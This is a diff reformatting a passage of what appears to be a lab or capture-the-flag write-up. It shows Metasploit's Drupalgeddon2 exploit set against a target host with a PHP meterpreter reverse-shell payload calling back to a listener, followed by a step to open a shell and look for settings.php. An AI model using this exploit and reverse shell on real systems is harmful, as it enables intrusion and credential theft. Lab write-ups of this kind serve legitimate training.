@@ -33,38 +33,36 @@ Got Metasploit exploit for Drupal 7
 https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/
 
 use exploit(unix/webapp/drupal_drupalgeddon2) and set options like 
-`
-msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options
 
-Module options (exploit/unix/webapp/drupal_drupalgeddon2):
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options
 
-   Name         Current Setting  Required  Description
-   ----         ---------------  --------  -----------
-   DUMP_OUTPUT  false            no        Dump payload command output
-   PHP_FUNC     passthru         yes       PHP function to execute
-   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT        80               yes       The target port (TCP)
-   SSL          false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI    /?q=user         yes       Path to Drupal install
-   VHOST                         no        HTTP server virtual host
+	Module options (exploit/unix/webapp/drupal_drupalgeddon2):
 
-
-Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  10.10.14.16      yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+   	Name         Current Setting  Required  Description
+   	----         ---------------  --------  -----------
+   	DUMP_OUTPUT  false            no        Dump payload command output
+   	PHP_FUNC     passthru         yes       PHP function to execute
+   	Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   	RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   	RPORT        80               yes       The target port (TCP)
+   	SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   	TARGETURI    /?q=user         yes       Path to Drupal install
+   	VHOST                         no        HTTP server virtual host
 
 
-Exploit target:
+	Payload options (php/meterpreter/reverse_tcp):
 
-   Id  Name
-   --  ----
-   0   Automatic (PHP In-Memory)
+   	Name   Current Setting  Required  Description
+   	----   ---------------  --------  -----------
+   	LHOST  10.10.14.16      yes       The listen address (an interface may be specified)
+   	LPORT  4444             yes       The listen port
 
-`
+	Exploit target:
+
+   	Id  Name
+   	--  ----
+   	0   Automatic (PHP In-Memory)
+	
 After getting meterpreter session then open the shell and look for settings.php
 
 	cd ..
